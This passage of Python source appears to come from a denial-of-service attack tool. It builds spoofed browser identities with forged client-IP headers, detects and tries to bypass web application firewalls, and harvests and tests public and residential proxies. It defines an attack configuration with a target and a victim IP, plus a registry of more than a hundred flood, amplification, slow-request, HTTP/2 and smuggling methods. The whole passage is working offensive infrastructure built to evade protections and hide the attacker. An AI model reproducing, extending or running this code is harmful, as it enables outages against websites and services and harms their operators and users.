    "https://www.tumblr.com/widgets/share/tool?canonicalUrl=",
]

COMMON_SUBDOMAINS = [
    "mail", "dev", "staging", "origin", "cpanel", "webmail", "direct",
    "backend", "api", "admin", "portal", "test", "stage", "prod",
    "server", "host", "vpn", "ftp", "sftp", "ssh", "db", "database",
    "app", "mobile", "m", "www2", "web", "ns1", "ns2", "dns", "mx",
    "cdn", "static", "assets", "media", "img", "images", "files",
    "blog", "shop", "store", "secure", "login", "auth", "sso",
]

CHROME_HEADER_ORDER = [
    "Host", "Connection", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
    "Upgrade-Insecure-Requests", "User-Agent", "Accept", "Sec-Fetch-Site",
    "Sec-Fetch-Mode", "Sec-Fetch-User", "Sec-Fetch-Dest", "Accept-Encoding",
    "Accept-Language", "Cookie",
]

CHROME_133_SETTINGS = "1:65536;2:0;3:1000;4:6291456;5:16384;6:262144"
CHROME_133_WINDOW_UPDATE = 15663105


# ═══════════════════════════════════════════════════════════════════════════════
#  FAST UA GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

class FastUAGenerator:
    CHROME_VERSIONS = list(range(99, 147))
    CHROME_BUILDS = {str(v): f"{random.randint(4000, 7999)}.0" for v in CHROME_VERSIONS}
    CHROME_WEBKIT = "537.36"
    CHROME_PLATFORMS = {
        "win": ["Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64"],
        "mac": ["Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 13_6_4"],
        "linux": ["X11; Linux x86_64", "X11; Ubuntu; Linux x86_64"],
    }
    FIREFOX_VERSIONS = list(range(100, 148))
    SAFARI_VERSIONS = list(range(15, 27))
    EDGE_VERSIONS = list(range(99, 132))

    def __init__(self):
        self._lock = threading.Lock()

    def _pick(self, lst): return random.choice(lst)

    def chrome_desktop(self):
        v = self._pick(self.CHROME_VERSIONS)
        b = self.CHROME_BUILDS.get(str(v), "5000.0")
        p = self._pick(self.CHROME_PLATFORMS[random.choice(["win", "mac", "linux"])])
        return f"Mozilla/5.0 ({p}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{v}.0.{b}.0 Safari/{self.CHROME_WEBKIT}"

    def chrome_mobile(self):
        v = self._pick(self.CHROME_VERSIONS)
        b = self.CHROME_BUILDS.get(str(v), "5000.0")
        p = f"Linux; Android {random.randint(10, 15)}; {random.choice(['Pixel 8','SM-S928B','SM-A536E','Pixel 7'])}"
        return f"Mozilla/5.0 ({p}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{v}.0.{b}.0 Mobile Safari/{self.CHROME_WEBKIT}"

    def firefox_desktop(self):
        v = self._pick(self.FIREFOX_VERSIONS)
        p = self._pick(["Windows NT 10.0; Win64; x64", "X11; Linux x86_64", "Macintosh; Intel Mac OS X 10.15"])
        return f"Mozilla/5.0 ({p}; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"

    def safari_desktop(self):
        v = self._pick(self.SAFARI_VERSIONS)
        w = f"605.1.{random.randint(15, 20)}"
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_0) AppleWebKit/{w} (KHTML, like Gecko) Version/{v}.{random.randint(0,5)} Safari/{w}"

    def safari_mobile(self):
        v = self._pick(self.SAFARI_VERSIONS)
        w = f"605.1.{random.randint(15, 20)}"
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15, 18)}_{random.randint(0,9)} like Mac OS X) AppleWebKit/{w} (KHTML, like Gecko) Version/{v}.{random.randint(0,5)} Mobile/15E148 Safari/604.1"

    def edge_desktop(self):
        v = self._pick(self.EDGE_VERSIONS)
        b = f"0.{random.randint(1000, 2900)}.{random.randint(10, 60)}"
        p = self._pick(self.CHROME_PLATFORMS["win"])
        return f"Mozilla/5.0 ({p}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/{self.CHROME_WEBKIT} Edg/{v}.0.{b}"

    def random(self):
        return random.choice([
            self.chrome_desktop, self.chrome_mobile, self.firefox_desktop,
            self.safari_desktop, self.safari_mobile, self.edge_desktop,
        ])()

    def get_sec_ch_ua(self, ua: str) -> Dict[str, str]:
        if "Chrome/" in ua and "Edg/" not in ua:
            m = re.search(r"Chrome/(\d+)", ua)
            v = m.group(1) if m else "133"
            return {
                "sec-ch-ua": f'"Chromium";v="{v}", "Google Chrome";v="{v}", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?1" if "Mobile" in ua else "?0",
                "sec-ch-ua-platform": ('"Android"' if "Android" in ua
                                       else '"Windows"' if "Windows" in ua
                                       else '"macOS"'),
            }
        if "Edg/" in ua:
            m = re.search(r"Edg/(\d+)", ua)
            v = m.group(1) if m else "131"
            return {
                "sec-ch-ua": f'"Microsoft Edge";v="{v}", "Chromium";v="{v}", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
        return {}


# ═══════════════════════════════════════════════════════════════════════════════
#  PER-REQUEST IDENTITY
# ═══════════════════════════════════════════════════════════════════════════════

class PerRequestIdentity:
    def __init__(self, ua_gen: Optional[FastUAGenerator] = None):
        self.ua_gen = ua_gen or FastUAGenerator()

    def generate(self, original_host: Optional[str] = None) -> Dict[str, Any]:
        ua = self.ua_gen.random()
        sec_ch = self.ua_gen.get_sec_ch_ua(ua)
        h: Dict[str, str] = OrderedDict()
        h["Host"] = original_host or ""
        h["Connection"] = random.choice(["keep-alive", "close"])
        for k, v in sec_ch.items():
            h[k] = v
        h["Upgrade-Insecure-Requests"] = "1"
        h["User-Agent"] = ua
        h["Accept"] = random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "*/*",
        ])
        h["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
        h["Sec-Fetch-Mode"] = "navigate"
        h["Sec-Fetch-User"] = "?1"
        h["Sec-Fetch-Dest"] = "document"
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Accept-Language"] = random.choice(ACCEPT_LANGS)
        cookie = "; ".join(
            f"{random.choice(COOKIE_NAMES)}={secrets.token_hex(8)}"
            for _ in range(random.randint(1, 3))
        )
        h["Cookie"] = cookie
        fake_ip = rand_ip()
        h["X-Forwarded-For"] = fake_ip
        h["X-Real-IP"] = fake_ip
        h["CF-Connecting-IP"] = fake_ip
        h["True-Client-IP"] = fake_ip
        h["Forwarded"] = f"for={fake_ip};proto=https"
        return {"user_agent": ua, "headers": dict(h), "sec_ch_ua": sec_ch,
                "referer": random.choice(REFERERS), "fake_ip": fake_ip}


# ═══════════════════════════════════════════════════════════════════════════════
#  STATS
# ═══════════════════════════════════════════════════════════════════════════════

class ShardedStats:
    def __init__(self, slots: int = 512):
        self.n = slots
        self.sent = [0] * slots
        self.failed = [0] * slots
        self.bytes_sent = [0] * slots
        self._tls = threading.local()
        self._start = time.monotonic()
        self._lock = threading.Lock()

    def _slot(self) -> int:
        s = getattr(self._tls, "i", None)
        if s is None:
            with self._lock:
                s = secrets.randbelow(self.n)
            self._tls.i = s
        return s

    def add_sent(self, n: int = 1, b: int = 0):
        i = self._slot()
        self.sent[i] += n
        self.bytes_sent[i] += b

    def add_failed(self):
        i = self._slot()
        self.failed[i] += 1

    def totals(self) -> Tuple[int, int, int]:
        return sum(self.sent), sum(self.failed), sum(self.bytes_sent)

    def snapshot(self) -> Dict[str, float]:
        s, f, b = self.totals()
        el = max(0.001, time.monotonic() - self._start)
        return {"sent": s, "failed": f, "bytes": b, "rate": s / el,
                "mbps": (b * 8) / el / 1e6, "elapsed": el}

    def reset(self):
        for i in range(self.n):
            self.sent[i] = 0
            self.failed[i] = 0
            self.bytes_sent[i] = 0
        self._start = time.monotonic()


# ═══════════════════════════════════════════════════════════════════════════════
#  RESOURCE GATE (fixed interval 0.2s)
# ═══════════════════════════════════════════════════════════════════════════════

class ResourceGate:
    def __init__(self):
        self.scale = 1.0
        self.paused = False
        self.reason = ""
        self.cpu_pct = 0.0
        self.ram_pct = 0.0
        self.ram_avail_gb = 0.0
        self.fd_count = -1
        self._stop = False
        self._th: Optional[threading.Thread] = None
        self._lock = threading.Lock()

    def start(self):
        if not HAS_PSUTIL or (self._th and self._th.is_alive()):
            return
        self._stop = False
        self._th = threading.Thread(target=self._loop, daemon=True,
                                     name="resgate")
        self._th.start()

    def stop(self):
        self._stop = True
        if self._th:
            self._th.join(timeout=1.5)

    def _loop(self):
        try:
            psutil.cpu_percent(interval=None)
            time.sleep(0.3)
        except Exception:
            pass
        while not self._stop:
            try:
                cpu = psutil.cpu_percent(interval=None)
                mem = psutil.virtual_memory()
                ram = mem.percent
                avail = mem.available / (1024 ** 3)
                fd = -1
                if IS_LINUX:
                    with suppress(Exception):
                        fd = len(os.listdir("/proc/self/fd"))
                s = 1.0
                if cpu > 95 or ram > 95:
                    s = 0.20
                elif cpu > 90 or ram > 88:
                    s = 0.45
                elif cpu > 80 or ram > 78:
                    s = 0.70
                elif cpu < 25 and ram < 55:
                    s = 2.00
                elif cpu < 40 and ram < 65:
                    s = 1.40
                with self._lock:
                    self.scale = max(0.05, min(3.0, s))
                    self.cpu_pct = cpu
                    self.ram_pct = ram
                    self.ram_avail_gb = avail
                    self.fd_count = fd
                    if ram > 95 or cpu > 97:
                        self.paused = True
                        self.reason = f"CPU={cpu:.0f}% RAM={ram:.0f}%"
                    elif ram < 80 and cpu < 85:
                        self.paused = False
                        self.reason = ""
            except Exception:
                with self._lock:
                    self.scale = 1.0
            time.sleep(0.2)

    def get(self) -> float:
        with self._lock:
            return self.scale

    def is_paused(self) -> bool:
        with self._lock:
            return self.paused

    def snapshot(self) -> Dict[str, Any]:
        with self._lock:
            return {"scale": self.scale, "cpu": self.cpu_pct, "ram": self.ram_pct,
                    "ram_avail_gb": self.ram_avail_gb, "fd": self.fd_count,
                    "paused": self.paused, "reason": self.reason}


resource_gate = ResourceGate()


# ═══════════════════════════════════════════════════════════════════════════════
#  RATE LIMITERS
# ═══════════════════════════════════════════════════════════════════════════════

class FixedRateLimiter:
    def __init__(self, rate_pps: int = 0):
        self.rate = max(0, rate_pps)
        self.tokens = float(self.rate) if self.rate else 0.0
        self.last = time.monotonic()
        self.lock = threading.Lock()

    def allow(self, n: int = 1) -> bool:
        if self.rate <= 0:
            return True
        with self.lock:
            now = time.monotonic()
            dt = now - self.last
            self.last = now
            self.tokens = min(self.rate, self.tokens + dt * self.rate)
            if self.tokens >= n:
                self.tokens -= n
                return True
            return False

    async def acquire(self, n: int = 1):
        while not self.allow(n):
            await asyncio.sleep(0.001)


class AdaptiveRateLimiter:
    def __init__(self, base_rate: int = 5000, burst: int = 20000,
                 min_rate: int = 500, max_rate: int = 1000000):
        self.base = base_rate
        self.current = base_rate
        self.min = min_rate
        self.max = max_rate
        self.burst = burst
        self.tokens = float(burst)
        self.last = time.monotonic()
        self.lock = threading.Lock()
        self.error_win: List[float] = []
        self.backoff_count = 0
        self.last_backoff = 0.0
        self.ssl_errors = 0

    def record_error(self, etype: str = ""):
        if "SSL" in etype:
            self.ssl_errors += 1
            return
        now = time.monotonic()
        with self.lock:
            self.error_win.append(now)
            self.error_win = [x for x in self.error_win if now - x < 5.0]
            if len(self.error_win) > 300 and (now - self.last_backoff > 2.0):
                self.current = max(self.min, int(self.current * 0.95))
                self.last_backoff = now
                self.backoff_count += 1

    def record_success(self):
        now = time.monotonic()
        with self.lock:
            if self.current < self.base and (now - self.last_backoff > 3.0):
                self.current = min(self.base, int(self.current * 1.15))

    def force_reduce(self, factor: float = 0.5):
        with self.lock:
            self.current = max(self.min, int(self.current * factor))
            self.backoff_count += 1

    def consume(self, n: int = 1) -> bool:
        with self.lock:
            now = time.monotonic()
            dt = now - self.last
            self.last = now
            self.tokens = min(self.burst, self.tokens + dt * self.current)
            if self.tokens >= n:
                self.tokens -= n
                return True
            return False

    async def acquire(self, n: int = 1):
        while not self.consume(n):
            await asyncio.sleep(0.0005)

    def get_rate(self) -> int:
        with self.lock:
            return self.current


# ═══════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION
# ═══════════════════════════════════════════════════════════════════════════════

WAF_SIGS = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "Akamai":     ["akamai", "akamai-grn", "ak-bmsc"],
    "AWS_WAF":    ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
    "Imperva":    ["x-iinfo", "incap_ses", "visid_incap"],
    "Sucuri":     ["x-sucuri-id", "sucuri"],
    "F5_BIGIP":   ["bigipserver", "x-wa-info", "f5-"],
    "ModSec":     ["mod_security", "modsecurity"],
    "Fastly":     ["x-fastly", "fastly-io-info"],
    "Barracuda":  ["barra_counter_session", "barracuda"],
    "FortiWeb":   ["x-fw-", "fortiweb"],
    "Azure":      ["x-azure-ref", "microsoft-azure"],
    "ArvanCloud": ["arvancloud", "ar-"],
    "LiteSpeed":  ["litespeed", "lsws"],
    "Radware":    ["x-rdwr-", "radware"],
    "Wallarm":    ["x-wallarm-"],
    "Reblaze":    ["rbzid", "reblaze"],
}


class WAFDetector:
    def __init__(self):
        self.name = "Unknown"
        self.confidence = 0.0

    def detect_from_http(self, headers: Dict[str, str], body: str,
                         cookies: Optional[Dict[str, str]] = None) -> Optional[str]:
        hl = {k.lower(): (v or "").lower() for k, v in (headers or {}).items()}
        bl = (body or "")[:16384].lower()
        cl = [c.lower() for c in (cookies or {}).keys()]
        best, score = None, 0
        for waf, sigs in WAF_SIGS.items():
            s = 0
            for sig in sigs:
                sig = sig.lower()
                if any(sig in v or sig == k for k, v in hl.items()):
                    s += 3
                if any(sig in c for c in cl):
                    s += 2
                if sig in bl:
                    s += 2
            if s > score:
                score, best = s, waf
        if best and score >= 3:
            self.name = best
            self.confidence = min(1.0, score / 10.0)
            return best
        return None


# ═══════════════════════════════════════════════════════════════════════════════
#  WAF BYPASS ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class WAFBypassEngine:
    TLS_PROFILES = CURL_IMPERSONATE
    METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD",
               "OPTIONS", "TRACE", "CONNECT", "FOO", "BAR"]
    OVERRIDE_HEADERS = [
        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
        "X-Original-Method", "X-Forwarded-Method",
    ]

    @staticmethod
    def align_headers(ua: str, sec_ch: Dict[str, str],
                      base: Dict[str, str]) -> Dict[str, str]:
        h = OrderedDict(base)
        if "Chrome/" in ua and "Edg/" not in ua:
            h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            h["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
            h["Sec-Fetch-Mode"] = "navigate"
            h["Sec-Fetch-User"] = "?1"
            h["Sec-Fetch-Dest"] = "document"
            h["Accept-Encoding"] = "gzip, deflate, br, zstd"
            h["Accept-Language"] = random.choice(ACCEPT_LANGS)
            h["sec-ch-ua-mobile"] = "?0"
            h["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
        elif "Firefox/" in ua:
            h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            h["Accept-Encoding"] = "gzip, deflate, br"
            h["Accept-Language"] = random.choice(["en-US,en;q=0.5", "fa-IR,fa;q=0.5"])
            for k in ("sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"):
                h.pop(k, None)
        elif "Safari/" in ua:
            h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            h["Accept-Encoding"] = "gzip, deflate, br"
            h["Accept-Language"] = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"])
            for k in ("sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"):
                h.pop(k, None)
        elif "Edg/" in ua:
            h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            h["Sec-Fetch-Site"] = random.choice(["none", "same-origin"])
            h["Sec-Fetch-Mode"] = "navigate"
            h["Sec-Fetch-User"] = "?1"
            h["Sec-Fetch-Dest"] = "document"
            h["Accept-Encoding"] = "gzip, deflate, br, zstd"
            h["Accept-Language"] = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"])
            h["sec-ch-ua-mobile"] = "?0"
            h["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"'])
        return dict(h)

    @staticmethod
    def random_method() -> str:
        return random.choices(
            WAFBypassEngine.METHODS,
            weights=[0.30, 0.15, 0.08, 0.05, 0.05, 0.08, 0.05, 0.03, 0.03, 0.05, 0.05],
            k=1,
        )[0]


# ═══════════════════════════════════════════════════════════════════════════════
#  PROXY MANAGER
# ═══════════════════════════════════════════════════════════════════════════════

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
]

RESIDENTIAL_PROVIDERS = {
    "brightdata": {"url": "brd.superproxy.io:22225"},
    "oxylabs":    {"url": "pr.oxylabs.io:7777"},
    "smartproxy": {"url": "gate.smartproxy.com:7000"},
    "iproyal":    {"url": "geo.iproyal.com:12321"},
}


def _parse_proxy(line: str) -> Optional[Dict[str, Any]]:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    scheme = "http"
    if "://" in line:
        p = urlparse(line)
        scheme = p.scheme
        netloc = p.netloc
    else:
        netloc = line
    if ":" not in netloc:
        return None
    ip, port_s = netloc.rsplit(":", 1)
    if not port_s.isdigit():
        return None
    scheme_map = {"http": "http", "https": "http", "socks5": "socks5",
                  "socks4": "socks4", "socks4a": "socks4", "socks": "socks5"}
    return {"ip": ip, "port": int(port_s),
            "type": scheme_map.get(scheme, "http")}


def _fetch_proxies() -> List[Dict[str, Any]]:
    if not HAS_REQUESTS:
        return []
    out: List[Dict[str, Any]] = []
    for url in PROXY_SOURCES:
        with suppress(Exception):
            r = requests.get(url, timeout=15,
                             headers={"User-Agent": FastUAGenerator().random()})
            if r.status_code == 200:
                for line in r.text.splitlines():
                    p = _parse_proxy(line)
                    if p:
                        out.append(p)
    return out


def _test_proxy(proxy: Dict[str, Any], timeout: float = 1.5) -> Tuple[Dict[str, Any], float, bool]:
    targets = [("1.1.1.1", 53), ("8.8.8.8", 53), ("9.9.9.9", 53)]
    t0 = time.monotonic()
    try:
        if proxy["type"] in ("socks4", "socks5") and HAS_PYSOCKS:
            for ip, port in targets:
                try:
                    s = pysocks.socksocket()
                    st = pysocks.SOCKS4 if proxy["type"] == "socks4" else pysocks.SOCKS5
                    s.set_proxy(st, proxy["ip"], proxy["port"])
                    s.settimeout(timeout)
                    s.connect((ip, port))
                    s.close()
                    return proxy, (time.monotonic() - t0) * 1000, True
                except Exception:
                    continue
            return proxy, 9999, False
        for ip, port in targets:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((proxy["ip"], proxy["port"]))
                sock.close()
                return proxy, (time.monotonic() - t0) * 1000, True
            except Exception:
                continue
        return proxy, 9999, False
    except Exception:
        return proxy, 9999, False


def _test_batch(proxies: List[Dict[str, Any]],
                workers: int = 500) -> List[Dict[str, Any]]:
    if not proxies:
        return []
    alive: List[Dict[str, Any]] = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(_test_proxy, p): p for p in proxies}
        for f in as_completed(futs):
            with suppress(Exception):
                proxy, lat, ok = f.result()
                if ok and lat < 2000:
                    proxy["latency"] = lat
                    alive.append(proxy)
    alive.sort(key=lambda x: x.get("latency", 9999))
    return alive


class ProxyManager:
    def __init__(self):
        self.proxies: List[Dict[str, Any]] = []
        self.residential: Optional[Dict[str, Any]] = None
        self.lock = threading.RLock()
        self._rr = 0

    async def load(self, use_residential: bool = False) -> int:
        if use_residential and self.residential:
            with self.lock:
                self.proxies = [dict(self.residential) for _ in range(500)]
            return 500
        loop = asyncio.get_running_loop()
        raw = await loop.run_in_executor(None, _fetch_proxies)
        if not raw:
            return 0
        log.info(f"   testing {len(raw)} proxies...")
        alive = await loop.run_in_executor(None, _test_batch, raw[:2000], 500)
        log.info(f"   {len(alive)} alive")
        if not alive:
            return 0
        with self.lock:
            self.proxies = alive[:10000]
        return len(self.proxies)

    def set_residential(self, provider: str, user: Optional[str] = None,
                        password: Optional[str] = None):
        if provider in RESIDENTIAL_PROVIDERS:
            host, port = RESIDENTIAL_PROVIDERS[provider]["url"].split(":")
            self.residential = {"ip": host, "port": int(port), "type": "http",
                                "user": user or "user",
                                "password": password or "pass"}

    def get(self) -> Optional[Dict[str, Any]]:
        with self.lock:
            if not self.proxies:
                return None
            self._rr = (self._rr + 1) % len(self.proxies)
            return self.proxies[self._rr]

    def count(self) -> int:
        with self.lock:
            return len(self.proxies)

    def mark_dead(self, proxy: Dict[str, Any]):
        with self.lock:
            try:
                self.proxies.remove(proxy)
            except ValueError:
                pass


proxy_mgr = ProxyManager()


# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════════

CONFIG_FILE = HOME_DIR / "config.json"


@dataclass
class Config:
    theme: str = "cyberghost"
    lang: str = "fa"
    duration: int = DEFAULT_DURATION
    concurrency: int = 2000
    use_proxy: bool = False
    adaptive: bool = True
    waf_bypass: bool = True
    rate_limit_pps: int = 0

    @classmethod
    def load(cls) -> "Config":
        if CONFIG_FILE.exists():
            with suppress(Exception):
                d = json.loads(CONFIG_FILE.read_text())
                return cls(**{k: v for k, v in d.items()
                              if k in cls.__dataclass_fields__})
        return cls()

    def save(self):
        with suppress(Exception):
            CONFIG_FILE.write_text(json.dumps(asdict(self), indent=2,
                                               ensure_ascii=False))


@dataclass
class AttackConfig:
    target: str
    port: int = 0
    method: str = "INFINITY_MIX"
    duration: int = DEFAULT_DURATION
    concurrency: int = 2000
    use_proxy: bool = False
    adaptive: bool = True
    waf_bypass: bool = True
    rate_limit_pps: int = 0
    game_port: int = 0
    victim_ip: str = ""


cfg = Config.load()
apply_theme(cfg.theme)
set_lang(cfg.lang)


# ═══════════════════════════════════════════════════════════════════════════════
#  METHOD REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════

METHODS: List[Tuple[str, str]] = [
    ("INFINITY_MIX", "🌌"),
    # L4 TCP
    ("SYN_FLOOD", "🔥"), ("ACK_FLOOD", "📨"), ("RST_FLOOD", "🛑"),
    ("FIN_FLOOD", "🏁"), ("XMAS_FLOOD", "🎄"), ("NULL_FLOOD", "⬛"),
    ("PSH_FLOOD", "📤"), ("URG_FLOOD", "🚨"), ("SYN_ACK_FLOOD", "🤝"),
    ("IPSPOOF_SYN", "🎭"), ("TCP_TS_SPOOF", "⏰"),
    ("TCP_SACK_ABUSE", "🎁"), ("TCP_FASTOPEN", "🚀"),
    ("LAND_ATTACK", "🏠"), ("TCP_AMP", "⚡"), ("SCTP_INIT", "📡"),
    # L4 UDP/ICMP
    ("UDP_FLOOD", "💀"), ("ICMP_FLOOD", "⚡"), ("ICMP_FRAG", "🧩"),
    ("JUMBO_FRAME", "🐘"), ("FRAG_FLOOD", "🧩"),
    ("GRE_FLOOD", "🔀"), ("ESP_FLOOD", "🔐"), ("IPIP_FLOOD", "🎁"),
    ("IP_OPTIONS_FLOOD", "🧬"), ("MAC_SPOOF", "🔗"),
    ("SMURF_ATTACK", "💥"), ("IPV6_RAW", "6️⃣"), ("PQC_QUIC", "🔮"),
    # AMP
    ("DNS_AMP", "📡"), ("DNS_QUERY", "❓"), ("DNS_EDNS0", "📡"),
    ("NTP_MONLIST", "🕐"), ("MEMCACHED", "💾"), ("SSDP", "🔌"),
    ("CLDAP", "📂"), ("LDAP_AMP", "🔍"), ("SNMP", "📊"),
    ("NETBIOS", "🪟"), ("MDNS", "🖥️"), ("WSD", "🔎"),
    ("RIPV1", "🛣️"), ("QOTD", "📜"), ("CHARGEN", "⚡"),
    ("STUN", "🌐"), ("DTLS", "🔒"), ("COAP", "🌊"),
    ("TFTP", "📦"), ("SLP", "📢"), ("PORTMAP", "🗺️"),
    ("JENKINS", "🔨"), ("CISCO_SI", "🔧"), ("MQTT_SN", "📬"),
    ("QUAKE3", "🎯"), ("STEAM_A2S", "🎮"), ("RDP_UDP", "🖥️"),
    ("BACNET", "🏢"), ("IPMI", "🔌"), ("OPENVPN", "🔐"),
    ("IKE", "🔑"), ("PPTP", "📞"), ("L2TP", "🔗"), ("ZIGBEE", "📡"),
    # HTTP/1.1
    ("HTTP_FLOOD", "🌊"), ("HTTP_GET", "📥"), ("HTTP_POST", "📤"),
    ("HTTP_HEAD", "📄"), ("HTTP_PIPELINE", "📶"),
    ("CFB", "☁️"), ("CFBUAM", "☁️"), ("BYPASS", "🚪"),
    ("DYN", "🎲"), ("NULL_HTTP", "⬛"), ("COOKIE", "🍪"),
    ("PPS", "💨"), ("GSB", "🔍"), ("RHEX", "🧬"),
    ("BOT", "🤖"), ("STRESS", "⚡"), ("BOMB", "💣"),
    ("APACHE_KILLER", "🪓"), ("XMLRPC", "📜"),
    ("HEADER_BOMB", "📮"), ("CACHE_BYPASS", "🗝️"),
    ("CACHE_POISONING", "☠️"), ("CF_BYPASS", "☁️"),
    ("RANGE_BOMB", "💥"), ("RANGE_AMP", "📡"),
    ("JSON_BOMB", "💣"), ("XML_BOMB", "💥"), ("PROTOBUF_BOMB", "🧱"),
    ("BROTLI_BOMB", "🗜️"), ("REGEX_DOS", "🔴"),
    ("GRAPHQL_DEPTH", "📊"), ("GRAPHQL_ALIAS", "🎭"),
    ("SMUGGLE_CLTE", "🕵️"), ("SMUGGLE_TECL", "🕵️"),
    ("HOST_HEADER_INJECT", "🎯"), ("OPERATOR_FATIGUE", "😵"),
    # Slow
    ("SLOWLORIS", "🐌"), ("SLOW_READ", "📖"), ("RUDY", "💧"),
    ("SLOW_HEADERS", "🐌"), ("SLOW_BODY", "🐛"),
    # HTTP/2
    ("HTTP2_RAPID_RESET", "⚡"), ("HTTP2_PING", "🏓"),
    ("HTTP2_SETTINGS", "⚙️"), ("HTTP2_WINDOW_UPDATE", "🪟"),
    ("HTTP2_HPACK_BOMB", "💣"), ("HTTP2_MULTIPLEX", "🔀"),
    ("HTTP2_GOAWAY", "🚪"), ("HTTP2_RST_SPAM", "🛑"),
    ("HTTP2_MADE_YOU_RESET", "🔁"), ("HTTP2_SMUGGLING", "🕵️"),
    ("HTTP2_GRPC_CHURN", "⚙️"), ("HTTP2_PRIORITY", "🎯"),
    ("HTTP2_CONTINUATION", "🌊"),
    # HTTP/3
    ("HTTP3_QUIC_FLOOD", "🚀"), ("HTTP3_QPACK_BOMB", "💣"),
    ("HTTP3_RETRY_LOOP", "🔄"), ("HTTP3_0RTT", "0️⃣"),
    ("HTTP3_CLOSE_FLOOD", "🔚"), ("HTTP3_STREAM_RESET", "🔄"),
    ("QUIC_LEAK", "💧"),
    # TLS
    ("TLS_CLIENT_HELLO", "👋"), ("TLS_JA3_RANDOM", "🎭"),
    ("TLS_JA4_RANDOM", "🎭"), ("SNI_FLOOD", "🎭"),
    ("SNI_SPOOF", "🕵️"), ("TLS_ECH_FLOOD", "🕶️"),
    ("TLS_RENEGOTIATION", "🔁"), ("TLS_HEARTBLEED", "💔"),
    # WebSocket
    ("WEBSOCKET_FLOOD", "🔌"), ("WEBSOCKET_ZIP", "🗜️"),
    # Services
    ("REDIS_FLOOD", "🔴"), ("MONGO_FLOOD", "🍃"), ("ELASTIC_BOMB", "🔍"),
    ("MQTT_FLOOD", "📬"), ("AMQP_FLOOD", "🐰"), ("RDP_FLOOD", "🖥️"),
    ("VNC_FLOOD", "🖼️"), ("SMB_FLOOD", "🗂️"), ("SMTP_FLOOD", "✉️"),
    ("IMAP_FLOOD", "📧"), ("POP3_FLOOD", "📬"), ("FTP_FLOOD", "📁"),
    ("TELNET_FLOOD", "📞"), ("SSH_FLOOD", "🔑"), ("SIP_FLOOD", "📞"),
